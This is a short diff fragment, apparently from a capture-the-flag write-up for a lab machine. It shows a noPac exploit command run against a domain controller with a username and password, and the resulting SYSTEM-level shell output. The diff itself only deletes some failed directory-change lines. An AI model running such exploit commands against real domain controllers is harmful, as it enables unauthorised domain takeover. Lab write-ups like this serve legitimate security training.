@@ -412,10 +412,6 @@ python3 noPac.py retro2.vl/ldapreader:ppYaVcB5R -dc-ip 10.129.12.5 -dc-host BLN0
 C:\Windows\system32>whoami
 nt authority\system
 
-C:\Windows\system32>cd ../../Users/Administrator
-[-] You can't CD under SMBEXEC. Use full paths.
-C:\Windows\system32>cd C:/Users/Administrator/Desktop
-[-] You can't CD under SMBEXEC. Use full paths.
 C:\Windows\system32>whoami /priv
 
 PRIVILEGES INFORMATION
